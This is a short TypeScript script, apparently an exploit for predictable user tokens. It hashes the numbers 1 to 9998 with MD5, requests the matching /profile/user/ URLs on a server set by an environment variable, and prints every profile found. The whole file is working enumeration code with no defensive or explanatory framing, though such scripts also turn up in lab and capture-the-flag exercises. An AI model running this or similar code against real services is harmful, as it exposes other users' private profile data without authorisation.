import { md5 } from "js-md5";

const serverHost = process.env.SERVER_HOST;
async function tryToken(token: string) {
  const req = await fetch(`${serverHost}/profile/user/${token}`);
  const res = await req.text();
  if (res != "User not found.") {
    console.log(res);
  }
}

for (let i = 1; i < 9999; i++) {
  const toMD5 = md5(String(i));
  tryToken(toMD5);
}
